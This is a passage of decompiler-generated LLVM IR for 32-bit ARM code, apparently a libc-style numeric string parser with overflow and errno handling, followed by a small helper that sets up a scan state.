  %v0_16548 = phi i32 [ %v0_165e4, %dec_label_pc_165d4 ], [ %v0_161f0, %dec_label_pc_16504 ]
  %v0_16574 = phi i32 [ %v2_165dc, %dec_label_pc_165d4 ], [ %v0_16504, %dec_label_pc_16504 ]
  %v0_16578 = phi i32 [ %v5_165e0, %dec_label_pc_165d4 ], [ 0, %dec_label_pc_16504 ]
  %v0_1653c = phi i32 [ %v1_165e4, %dec_label_pc_165d4 ], [ %v1_161f0, %dec_label_pc_16504 ]
  %v2_16510 = icmp ugt i32 %v0_1653c, 8
  %v7_16510 = icmp eq i32 %v0_1653c, 9
  %v2_16514 = xor i1 %v7_16510, true
  %v3_16514 = and i1 %v2_16510, %v2_16514
  br i1 %v3_16514, label %bb199, label %bb200

bb199:                                            ; preds = %dec_label_pc_1650c
  store i32 0, i32* @r2, align 4
  br label %bb200

bb200:                                            ; preds = %dec_label_pc_1650c, %bb199
  %v2_16518 = xor i1 %v2_16510, true
  %v3_16518 = or i1 %v7_16510, %v2_16518
  br i1 %v3_16518, label %bb201, label %bb202

bb201:                                            ; preds = %bb200
  store i32 1, i32* @r2, align 4
  br label %bb202

bb202:                                            ; preds = %bb200, %bb201
  %v3_1651c = icmp ugt i32 %v0_16578, 429496728
  %v9_1651c = icmp eq i32 %v0_16578, 429496729
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_16524 = xor i1 %v9_1651c, true
  %v3_16524 = and i1 %v3_1651c, %v2_16524
  br i1 %v3_16524, label %dec_label_pc_16530, label %dec_label_pc_16528

dec_label_pc_16528:                               ; preds = %bb202
  br i1 %v9_1651c, label %dec_label_pc_1655c, label %dec_label_pc_1652c

dec_label_pc_1652c:                               ; preds = %dec_label_pc_1655c, %dec_label_pc_16528
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16530

dec_label_pc_16530:                               ; preds = %dec_label_pc_1655c, %bb202, %dec_label_pc_1652c
  %v1_16530 = phi i32 [ 0, %dec_label_pc_1655c ], [ 0, %bb202 ], [ 1, %dec_label_pc_1652c ]
  %v0_16530 = load i32, i32* @r2, align 4
  %v2_16530 = and i32 %v0_16530, %v1_16530
  %v2_16534 = icmp eq i32 %v2_16530, 0
  br i1 %v2_16534, label %dec_label_pc_1653c, label %dec_label_pc_16574

dec_label_pc_1653c:                               ; preds = %dec_label_pc_165fc, %dec_label_pc_16530, %dec_label_pc_16574
  br i1 %v3_16514, label %dec_label_pc_1635c, label %dec_label_pc_16544

dec_label_pc_16544:                               ; preds = %dec_label_pc_1653c
  store i32 ptrtoint (i32* @global_var_1a032.646 to i32), i32* %r0.global-to-local, align 4
  %v2_16548 = add i32 %v0_16548, ptrtoint (i32* @global_var_1a032.646 to i32)
  %v3_16548 = inttoptr i32 %v2_16548 to i8*
  %v4_16548 = load i8, i8* %v3_16548, align 1
  %tmp243 = icmp ult i8 %v4_16548, 10
  br i1 %tmp243, label %.thread144, label %dec_label_pc_1635c

.thread144:                                       ; preds = %dec_label_pc_16544
  %v6_16548 = zext i8 %v4_16548 to i32
  br label %dec_label_pc_163cc

dec_label_pc_1655c:                               ; preds = %dec_label_pc_16528
  %tmp244 = icmp ugt i32 %v0_16574, -1717986919
  br i1 %tmp244, label %dec_label_pc_16530, label %dec_label_pc_1652c

dec_label_pc_16574:                               ; preds = %dec_label_pc_16530
  %v2_16574 = mul i32 %v0_16574, 2
  store i32 %v2_16574, i32* %r1.global-to-local, align 4
  %v3_16574 = icmp ult i32 %v2_16574, %v0_16574
  %v3_16578 = mul i32 %v0_16578, 2
  %v4_16578 = zext i1 %v3_16574 to i32
  %v5_16578 = or i32 %v4_16578, %v3_16578
  store i32 %v5_16578, i32* %r2.global-to-local, align 4
  %v3_16580 = mul i32 %v5_16578, 4
  %tmp204 = udiv i32 %v0_16574, 536870912
  %v4_16584 = urem i32 %tmp204, 4
  %v5_16584 = or i32 %v3_16580, %v4_16584
  %v2_16590 = mul i32 %v0_16574, 10
  store i32 %v2_16590, i32* @r8, align 4
  %v1_16598 = and i32 %v0_1653c, 1073741824
  %v2_16598 = icmp ne i32 %v1_16598, 0
  %v3_16598 = ashr i32 %v0_1653c, 31
  %v4_165a4 = zext i1 %v2_16598 to i32
  %v3_165a4 = add i32 %v4_165a4, %v5_16578
  %v5_165a4 = add i32 %v3_165a4, %v5_16584
  store i32 %v5_165a4, i32* @sb, align 4
  %tmp245 = lshr i32 %v0_1653c, 31
  %v1_165a8 = add nsw i32 %tmp245, -1
  store i32 %v1_165a8, i32* @r4, align 4
  %v3_165ac = icmp uge i32 %v5_165a4, %v1_165a8
  %v9_165ac = icmp eq i32 %v5_165a4, %v1_165a8
  %v1_165b0 = sub i32 -1, %v0_1653c
  %v2_165b4 = xor i1 %v9_165ac, true
  %v3_165b4 = and i1 %v3_165ac, %v2_165b4
  br i1 %v3_165b4, label %dec_label_pc_1653c, label %dec_label_pc_165b8

dec_label_pc_165b8:                               ; preds = %dec_label_pc_16574
  br i1 %v9_165ac, label %dec_label_pc_165fc, label %dec_label_pc_165bc

dec_label_pc_165bc:                               ; preds = %dec_label_pc_165fc, %dec_label_pc_165b8
  %v0_165bc = load i32, i32* @sl, align 4
  %v1_165bc = add i32 %v0_165bc, 4
  %v2_165bc = inttoptr i32 %v1_165bc to i32*
  %v3_165bc = load i32, i32* %v2_165bc, align 4
  store i32 %v3_165bc, i32* %r2.global-to-local, align 4
  %v1_165c0 = add i32 %v0_165bc, 104
  %v2_165c0 = inttoptr i32 %v1_165c0 to i32*
  %v3_165c0 = load i32, i32* %v2_165c0, align 4
  %v3_165c4 = icmp ult i32 %v3_165bc, %v3_165c0
  br i1 %v3_165c4, label %.thread51.dec_label_pc_165d4_crit_edge, label %dec_label_pc_165ec

.thread51.dec_label_pc_165d4_crit_edge:           ; preds = %dec_label_pc_165bc
  %v2_165c8 = inttoptr i32 %v3_165bc to i8*
  %v3_165c8 = load i8, i8* %v2_165c8, align 1
  %v4_165c8 = zext i8 %v3_165c8 to i32
  store i32 %v4_165c8, i32* @r5, align 4
  %v6_165c8 = add i32 %v3_165bc, 1
  store i32 %v6_165c8, i32* %r2.global-to-local, align 4
  store i32 %v6_165c8, i32* %v2_165bc, align 4
  %v0_165e4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_165d4

dec_label_pc_165d4:                               ; preds = %.thread51.dec_label_pc_165d4_crit_edge, %dec_label_pc_165ec
  %v0_165e4 = phi i32 [ %v0_165e4.pre, %.thread51.dec_label_pc_165d4_crit_edge ], [ %v1_165f0, %dec_label_pc_165ec ]
  store i32 %v0_1653c, i32* %r1.global-to-local, align 4
  store i32 %v3_16598, i32* @r2, align 4
  %v0_165dc = load i32, i32* @r8, align 4
  %v2_165dc = add i32 %v0_165dc, %v0_1653c
  store i32 %v2_165dc, i32* @r6, align 4
  %v3_165dc = icmp ult i32 %v2_165dc, %v0_165dc
  %v0_165e0 = load i32, i32* @sb, align 4
  %v3_165e0 = add i32 %v0_165e0, %v3_16598
  %v4_165e0 = zext i1 %v3_165dc to i32
  %v5_165e0 = add i32 %v4_165e0, %v3_165e0
  store i32 %v5_165e0, i32* @r7, align 4
  %v1_165e4 = add i32 %v0_165e4, -48
  store i32 %v1_165e4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1650c

dec_label_pc_165ec:                               ; preds = %dec_label_pc_165bc
  store i32 %v0_165bc, i32* %r0.global-to-local, align 4
  %v1_165f0 = call i32 @function_167c8(i32 %v0_165bc)
  store i32 %v1_165f0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_165d4

dec_label_pc_165fc:                               ; preds = %dec_label_pc_165b8
  %tmp246 = icmp ugt i32 %v2_16590, %v1_165b0
  br i1 %tmp246, label %dec_label_pc_1653c, label %dec_label_pc_165bc

dec_label_pc_16608:                               ; preds = %dec_label_pc_16330
  %v2_1660c = load i32, i32* %stack_var_0, align 4
  store i32 %v2_1660c, i32* @r6, align 4
  store i32 %arg5, i32* @r7, align 4
  br label %dec_label_pc_1635c

dec_label_pc_16614:                               ; preds = %dec_label_pc_16380
  %v0_16614 = call i32 @function_12f18()
  %v2_1661c = load i32, i32* %stack_var_0, align 4
  %v2_16624 = add i32 %v2_1661c, -1
  %v3_16624 = icmp ne i32 %v2_1661c, 0
  %v3_1662c = add i32 %arg5, -1
  %v4_1662c = zext i1 %v3_16624 to i32
  %v5_1662c = add i32 %v3_1662c, %v4_1662c
  store i32 %v2_16624, i32* %stack_var_0, align 4
  store i32 34, i32* %r2.global-to-local, align 4
  %v2_1663c = inttoptr i32 %v0_16614 to i32*
  store i32 34, i32* %v2_1663c, align 4
  %v2_16644 = load i32, i32* %stack_var_0, align 4
  store i32 %v2_16644, i32* %r0.global-to-local, align 4
  store i32 %v5_1662c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16264

dec_label_pc_1664c:                               ; preds = %dec_label_pc_1637c
  %v1_16650 = load i32, i32* @r6, align 4
  %tmp247 = icmp ugt i32 %v3_1664c, %v1_16650
  br i1 %tmp247, label %dec_label_pc_16404, label %dec_label_pc_16380

dec_label_pc_1665c:                               ; preds = %dec_label_pc_16400
  %v0_16660 = load i32, i32* @r6, align 4
  %tmp248 = icmp ugt i32 %v0_16660, %v3_1664c
  br i1 %tmp248, label %dec_label_pc_163a0, label %dec_label_pc_16404

dec_label_pc_1666c:                               ; preds = %dec_label_pc_1612c
  store i32 %v0_1612c, i32* %r0.global-to-local, align 4
  %v1_16670 = call i32 @function_167c8(i32 %v0_1612c)
  store i32 %v1_16670, i32* %r0.global-to-local, align 4
  store i32 %v1_16670, i32* @r5, align 4
  br label %dec_label_pc_16144

dec_label_pc_1667c:                               ; preds = %dec_label_pc_16144
  %v0_1667c = load i32, i32* @sl, align 4
  %v1_1667c = add i32 %v0_1667c, 4
  %v2_1667c = inttoptr i32 %v1_1667c to i32*
  %v3_1667c = load i32, i32* %v2_1667c, align 4
  store i32 %v3_1667c, i32* %r2.global-to-local, align 4
  %v1_16680 = add i32 %v0_1667c, 104
  %v2_16680 = inttoptr i32 %v1_16680 to i32*
  %v3_16680 = load i32, i32* %v2_16680, align 4
  %v3_16684 = icmp ult i32 %v3_1667c, %v3_16680
  br i1 %v3_16684, label %.thread53.dec_label_pc_16694_crit_edge, label %dec_label_pc_166fc

.thread53.dec_label_pc_16694_crit_edge:           ; preds = %dec_label_pc_1667c
  %v2_16688 = inttoptr i32 %v3_1667c to i8*
  %v3_16688 = load i8, i8* %v2_16688, align 1
  %v4_16688 = zext i8 %v3_16688 to i32
  store i32 %v4_16688, i32* %r0.global-to-local, align 4
  %v6_16688 = add i32 %v3_1667c, 1
  store i32 %v6_16688, i32* %r2.global-to-local, align 4
  store i32 %v6_16688, i32* %v2_1667c, align 4
  %v0_16698.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16694

dec_label_pc_16694:                               ; preds = %.thread53.dec_label_pc_16694_crit_edge, %dec_label_pc_166fc
  %v0_16698 = phi i32 [ %v0_16698.pre, %.thread53.dec_label_pc_16694_crit_edge ], [ %v1_16700, %dec_label_pc_166fc ]
  %v2_16698 = add i32 %v0_16698, ptrtoint (i32* @global_var_1a032.646 to i32)
  %v3_16698 = inttoptr i32 %v2_16698 to i8*
  %v4_16698 = load i8, i8* %v3_16698, align 1
  %v6_16698 = zext i8 %v4_16698 to i32
  store i32 %v6_16698, i32* @fp, align 4
  %tmp249 = icmp ult i8 %v4_16698, 16
  br i1 %tmp249, label %.thread155, label %dec_label_pc_166b0

.thread155:                                       ; preds = %dec_label_pc_16694
  store i32 16, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_160ac

dec_label_pc_166b0:                               ; preds = %dec_label_pc_16694
  %v0_166b0 = load i32, i32* @sl, align 4
  %v1_166b0 = add i32 %v0_166b0, 104
  %v2_166b0 = inttoptr i32 %v1_166b0 to i32*
  %v3_166b0 = load i32, i32* %v2_166b0, align 4
  store i32 %v3_166b0, i32* %r2.global-to-local, align 4
  %v2_166b4 = icmp eq i32 %v3_166b0, 0
  br i1 %v2_166b4, label %.thread56, label %bb205

bb205:                                            ; preds = %dec_label_pc_166b0
  %v2_166b8 = add i32 %v0_166b0, 4
  %v3_166b8 = inttoptr i32 %v2_166b8 to i32*
  %v4_166b8 = load i32, i32* %v3_166b8, align 4
  %v2_166bc = add i32 %v4_166b8, -1
  store i32 %v2_166bc, i32* %v3_166b8, align 4
  br label %.thread56

.thread56:                                        ; preds = %dec_label_pc_166b0, %bb205
  %v0_166c4 = load i32, i32* @r6, align 4
  %v2_166c4 = icmp eq i32 %v0_166c4, 0
  br i1 %v2_166c4, label %dec_label_pc_16708, label %dec_label_pc_166cc

dec_label_pc_166cc:                               ; preds = %.thread56
  %v0_166cc = load i32, i32* %r2.global-to-local, align 4
  %v2_166cc = icmp eq i32 %v0_166cc, 0
  br i1 %v2_166cc, label %dec_label_pc_16734, label %dec_label_pc_166d4

dec_label_pc_166d4:                               ; preds = %dec_label_pc_166cc
  %v0_166d4 = load i32, i32* @sl, align 4
  %v1_166d4 = add i32 %v0_166d4, 4
  %v2_166d4 = inttoptr i32 %v1_166d4 to i32*
  %v3_166d4 = load i32, i32* %v2_166d4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_166e0 = add i32 %v3_166d4, -1
  store i32 0, i32* %stack_var_0, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v1_166e0, i32* %v2_166d4, align 4
  %v1_1626c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16264

dec_label_pc_166fc:                               ; preds = %dec_label_pc_1667c
  store i32 %v0_1667c, i32* %r0.global-to-local, align 4
  %v1_16700 = call i32 @function_167c8(i32 %v0_1667c)
  store i32 %v1_16700, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16694

dec_label_pc_16708:                               ; preds = %.thread56
  %v0_16708 = load i32, i32* @sl, align 4
  store i32 %v0_16708, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v8_16714 = call i32 @function_16764(i32 %v0_16708, i32 %tmp, i32 0, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %stack_var_0, align 4
  br label %dec_label_pc_16264

dec_label_pc_16734:                               ; preds = %dec_label_pc_166cc
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %stack_var_0, align 4
  br label %dec_label_pc_16264

; uselistorder directives
  uselistorder i32 %v1_16700, { 1, 0 }
  uselistorder i32 %v6_16698, { 1, 0 }
  uselistorder i32 %v3_1667c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_16670, { 1, 2, 0 }
  uselistorder i32 %v2_16644, { 1, 0 }
  uselistorder i32 %v1_165f0, { 1, 0 }
  uselistorder i32 %v1_165e4, { 1, 0 }
  uselistorder i32 %v5_165e0, { 1, 0 }
  uselistorder i32 %v2_165dc, { 1, 2, 0 }
  uselistorder i32 %v0_165dc, { 1, 0 }
  uselistorder i32 %v0_165e4, { 1, 0 }
  uselistorder i32 %v3_165bc, { 1, 0, 2, 3 }
  uselistorder i1 %v9_165ac, { 1, 0 }
  uselistorder i32 %v5_16578, { 1, 0, 2 }
  uselistorder i8 %v4_16548, { 1, 0 }
  uselistorder i1 %v9_1651c, { 1, 0 }
  uselistorder i1 %v7_16510, { 1, 0 }
  uselistorder i32 %v0_1653c, { 2, 3, 0, 1, 5, 4, 6, 7 }
  uselistorder i32 %v0_16578, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v0_16574, { 3, 2, 4, 1, 0 }
  uselistorder i32 %v1_164d4, { 1, 0 }
  uselistorder i32 %v3_164b8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1649c, { 2, 0, 1 }
  uselistorder i64 %v4_16494, { 1, 0 }
  uselistorder i32 %v5_1645c, { 1, 0 }
  uselistorder i32 %v0_16454, { 1, 0 }
  uselistorder i32 %v2_16418, { 2, 1, 0 }
  uselistorder i32 %v2_16410, { 1, 0 }
  uselistorder i32 %v3_1640c, { 1, 0 }
  uselistorder i32 %v1_163bc, { 1, 0 }
  uselistorder i32 %v3_163d8, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-60.2.off0, { 0, 2, 1 }
  uselistorder i32 %v2_163b0, { 1, 0 }
  uselistorder i32 %v3_1664c, { 1, 0, 2, 3 }
  uselistorder i1 %v9_16374, { 1, 2, 0 }
  uselistorder i32 %v1_16374, { 3, 0, 2, 1 }
  uselistorder i32 %stack_var_-44.2, { 3, 2, 0, 4, 1 }
  uselistorder i32 %v1_16314, { 0, 2, 1 }
  uselistorder i32 %v0_1631c, { 1, 0, 3, 2 }
  uselistorder i32 %v1_162dc, { 1, 0 }
  uselistorder i32 %v3_162a8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1628c, { 1, 0 }
  uselistorder i32 %v0_16238, { 1, 0 }
  uselistorder i32 %v1_161d0, { 1, 0 }
  uselistorder i32 %v3_16200, { 1, 0, 2, 3 }
  uselistorder i1 %v2_161f4, { 1, 0 }
  uselistorder i32 %v0_16504, { 0, 1, 3, 2 }
  uselistorder i32 %v0_161d4, { 1, 0 }
  uselistorder i32 %v0_161e8, { 1, 0 }
  uselistorder i32 %v1_1617c, { 1, 0 }
  uselistorder i32 %v3_161b0, { 1, 0, 2, 3 }
  uselistorder i1 %v3_161a4, { 1, 0 }
  uselistorder i32 %v4_16160, { 1, 0 }
  uselistorder i32 %v0_1615c, { 1, 2, 0 }
  uselistorder i32 %v3_1612c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_16124, { 1, 0 }
  uselistorder i32 %v1_1611c, { 1, 0 }
  uselistorder i32 %v3_16100, { 1, 0, 2, 3 }
  uselistorder i1 %v2_160f4, { 1, 0 }
  uselistorder i32 %v0_16298, { 1, 2, 0, 3 }
  uselistorder i32 %v1_160ac, { 18, 17, 16, 7, 13, 12, 0, 1, 2, 8, 9, 10, 15, 5, 3, 6, 14, 11, 19, 4 }
  uselistorder i32 %v4_161a8106, { 1, 0 }
  uselistorder i32 %v0_16094, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1607c, { 1, 2, 0 }
  uselistorder i32 %v0_16070142, { 1, 0 }
  uselistorder i32 %v3_16024, { 1, 0, 2, 3 }
  uselistorder i32 %v1_15ff0, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v3_15fd4, { 2, 3, 0, 1 }
  uselistorder i32* %v2_15fd4, { 1, 0 }
  uselistorder i32 %v2_15fe4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_15fc4, { 0, 2, 1 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 5, 6, 7, 8, 9, 10, 4, 11, 12, 13, 14, 15, 0 }
  uselistorder i32 %tmp, { 6, 5, 1, 4, 2, 3, 8, 9, 7, 0, 10 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 28, 29, 30, 25, 26, 27, 31, 32, 33, 34, 35, 36, 37, 38, 1, 39, 40, 41, 42, 43, 44, 45, 46, 47, 49, 48, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 23, 19, 20, 21, 22, 24, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 6, 12, 9, 7, 8, 10, 11, 15, 13, 14, 19, 17, 16, 18, 21, 20, 25, 22, 23, 24, 3, 26, 28, 27, 33, 29, 30, 31, 32, 40, 37, 34, 35, 36, 38, 39, 42, 41, 47, 43, 44, 45, 46, 51, 48, 49, 50, 55, 52, 53, 54, 2, 56, 0, 1 }
  uselistorder i32 536870912, { 2, 0, 1, 3 }
  uselistorder i8 10, { 0, 6, 1, 5, 7, 2, 3, 4 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @function_16764, { 2, 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_1a031.648 to i32), i32 1), { 1, 5, 4, 3, 2, 0, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_1a032.646 to i32), { 0, 1, 3, 2 }
  uselistorder i32 43, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 45, { 4, 0, 5, 3, 1, 6, 2, 7 }
  uselistorder i32 (i32)* @function_167c8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 37, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32* @fp, { 76, 0, 78, 77, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 142, 143, 144, 145, 106, 107, 108, 97, 98, 99, 100, 101, 102, 103, 1, 104, 105, 4, 5, 6, 7, 8, 9, 10, 11, 17, 18, 12, 13, 14, 15, 16, 19, 20, 90, 89, 91, 92, 93, 94, 23, 24, 25, 26, 27, 28, 29, 30, 31, 21, 22, 2, 32, 33, 34, 35, 36, 3, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 56, 52, 53, 54, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 95, 96, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141 }
  uselistorder i32 %arg5, { 3, 7, 8, 0, 9, 4, 5, 1, 2, 6 }
  uselistorder label %.thread56, { 1, 0 }
  uselistorder label %dec_label_pc_16694, { 1, 0 }
  uselistorder label %dec_label_pc_165d4, { 1, 0 }
  uselistorder label %dec_label_pc_1653c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_16530, { 0, 2, 1 }
  uselistorder label %bb202, { 1, 0 }
  uselistorder label %bb200, { 1, 0 }
  uselistorder label %dec_label_pc_164b4, { 1, 0 }
  uselistorder label %dec_label_pc_1644c, { 1, 0 }
  uselistorder label %dec_label_pc_16440, { 1, 0 }
  uselistorder label %dec_label_pc_163cc, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_163c0, { 1, 0 }
  uselistorder label %dec_label_pc_16380, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %dec_label_pc_1635c, { 5, 3, 4, 1, 2, 6, 0 }
  uselistorder label %bb197, { 1, 0 }
  uselistorder label %dec_label_pc_162f0, { 2, 1, 0 }
  uselistorder label %bb195, { 1, 0 }
  uselistorder label %dec_label_pc_162c0, { 1, 0 }
  uselistorder label %.thread42, { 1, 0 }
  uselistorder label %bb192, { 1, 0 }
  uselistorder label %dec_label_pc_161ec, { 1, 0 }
  uselistorder label %dec_label_pc_161d4, { 1, 0 }
  uselistorder label %dec_label_pc_161b0, { 1, 0 }
  uselistorder label %dec_label_pc_16198, { 1, 0 }
  uselistorder label %dec_label_pc_16180, { 1, 0 }
  uselistorder label %dec_label_pc_16144, { 1, 0 }
  uselistorder label %dec_label_pc_16124, { 1, 0 }
  uselistorder label %dec_label_pc_16100, { 1, 0 }
  uselistorder label %dec_label_pc_160f0, { 1, 0 }
  uselistorder label %dec_label_pc_160e0, { 1, 0 }
  uselistorder label %dec_label_pc_16084, { 1, 0 }
  uselistorder label %bb183, { 1, 0 }
  uselistorder label %dec_label_pc_16064, { 1, 0 }
  uselistorder label %bb181, { 1, 0 }
  uselistorder label %dec_label_pc_1604c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1603c, { 1, 0 }
  uselistorder label %dec_label_pc_15fd4, { 1, 0 }
  uselistorder label %dec_label_pc_15fd4.backedge, { 3, 0, 2, 1 }
}

define i32 @function_1675c() local_unnamed_addr {
dec_label_pc_1675c:
  %v0_1675c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1675c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_1675c
  %v1_1675c = load i32, i32* @sb, align 4
  %v20_1675c = add i32 %v1_1675c, 28
  %v21_1675c = inttoptr i32 %v20_1675c to i32*
  %v22_1675c = load i32, i32* %v21_1675c, align 4
  call void @__pseudo_branch(i32 %v22_1675c)
  %v0_16760.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16760.pr, label %.thread, label %bb1

bb1:                                              ; preds = %bb
  %v1_16760 = load i32, i32* @sb, align 4
  %v2_16760 = add i32 %v1_16760, 4
  %v3_16760 = inttoptr i32 %v2_16760 to i32*
  %v4_16760 = load i32, i32* %v3_16760, align 4
  %v23_16760 = add i32 %v1_16760, 32
  %v24_16760 = inttoptr i32 %v23_16760 to i32*
  %v25_16760 = load i32, i32* %v24_16760, align 4
  call void @__pseudo_branch(i32 %v25_16760)
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1675c, %bb, %bb1
  %.0 = phi i32 [ undef, %bb ], [ %v4_16760, %bb1 ], [ undef, %dec_label_pc_1675c ]
  ret i32 %.0

; uselistorder directives
  uselistorder label %.thread, { 2, 1, 0 }
}

define i32 @function_16764(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_16764:
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16764 = load i32, i32* @r4, align 4
  store i32 %v3_16764, i32* %stack_var_-8, align 4
  %v1_16768 = add i32 %arg1, 8
  %v2_16768 = inttoptr i32 %v1_16768 to i32*
  %v3_16768 = load i32, i32* %v2_16768, align 4
  store i32 %v3_16768, i32* @ip, align 4
  %v1_1676c = add i32 %arg1, 4
  %v2_1676c = inttoptr i32 %v1_1676c to i32*
  %v3_1676c = load i32, i32* %v2_1676c, align 4
  store i32 %v3_1676c, i32* %lr.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v2_16778 = sub i32 %v3_16768, %v3_1676c
  store i32 %v2_16778, i32* %r3.global-to-local, align 4
  %v2_1677c = or i32 %arg3, %arg2
  %v4_1677c = icmp eq i32 %v2_1677c, 0
  %v3_16780 = ashr i32 %v2_16778, 31
  store i32 %v3_16780, i32* %r4.global-to-local, align 4
  %v2_16784 = add i32 %arg1, 112
  %v3_16784 = inttoptr i32 %v2_16784 to i32*
  store i32 %arg2, i32* %v3_16784, align 4
  %v0_16788 = load i32, i32* %r2.global-to-local, align 4
  %v2_16788 = add i32 %arg1, 116
  %v3_16788 = inttoptr i32 %v2_16788 to i32*
  store i32 %v0_16788, i32* %v3_16788, align 4
  %v0_1678c = load i32, i32* %r3.global-to-local, align 4
  %v2_1678c = add i32 %arg1, 120
  %v3_1678c = inttoptr i32 %v2_1678c to i32*
  store i32 %v0_1678c, i32* %v3_1678c, align 4
  %v0_16790 = load i32, i32* %r4.global-to-local, align 4
  %v2_16790 = add i32 %arg1, 124
  %v3_16790 = inttoptr i32 %v2_16790 to i32*
  store i32 %v0_16790, i32* %v3_16790, align 4
  br i1 %v4_1677c, label %dec_label_pc_167b0, label %dec_label_pc_16798

dec_label_pc_16798:                               ; preds = %dec_label_pc_16764
  %v0_16798 = load i32, i32* %r4.global-to-local, align 4
  %v1_16798 = load i32, i32* %r2.global-to-local, align 4
  %v7_1679c = icmp sgt i32 %v0_16798, %v1_16798
  br i1 %v7_1679c, label %dec_label_pc_16798.dec_label_pc_167a0_crit_edge, label %dec_label_pc_167ac

dec_label_pc_16798.dec_label_pc_167a0_crit_edge:  ; preds = %dec_label_pc_16798
  %v1_167a0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_167a0

dec_label_pc_167a0:                               ; preds = %dec_label_pc_167bc, %dec_label_pc_16798.dec_label_pc_167a0_crit_edge
  %v1_167a0 = phi i32 [ %v1_167a0.pre, %dec_label_pc_16798.dec_label_pc_167a0_crit_edge ], [ %v1_167bc, %dec_label_pc_167bc ]
  %v0_167a0 = load i32, i32* %lr.global-to-local, align 4
  %v2_167a0 = add i32 %v0_167a0, %v1_167a0
  store i32 %v2_167a0, i32* %r3.global-to-local, align 4
  %v2_167a4 = add i32 %arg1, 104
  %v3_167a4 = inttoptr i32 %v2_167a4 to i32*
  store i32 %v2_167a0, i32* %v3_167a4, align 4
  br label %dec_label_pc_167b4

dec_label_pc_167ac:                               ; preds = %dec_label_pc_16798
  %v9_16798 = icmp eq i32 %v0_16798, %v1_16798
  br i1 %v9_16798, label %dec_label_pc_167bc, label %dec_label_pc_167b0

dec_label_pc_167b0:                               ; preds = %dec_label_pc_167bc, %dec_label_pc_167ac, %dec_label_pc_16764
  %v0_167b0 = load i32, i32* @ip, align 4
  %v2_167b0 = add i32 %arg1, 104
  %v3_167b0 = inttoptr i32 %v2_167b0 to i32*
  store i32 %v0_167b0, i32* %v3_167b0, align 4
  br label %dec_label_pc_167b4

dec_label_pc_167b4:                               ; preds = %dec_label_pc_167a0, %dec_label_pc_167b0
  %v2_167b4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_167b4, i32* %r4.global-to-local, align 4
  ret i32 %arg1

dec_label_pc_167bc:                               ; preds = %dec_label_pc_167ac
  %v0_167bc = load i32, i32* %r3.global-to-local, align 4
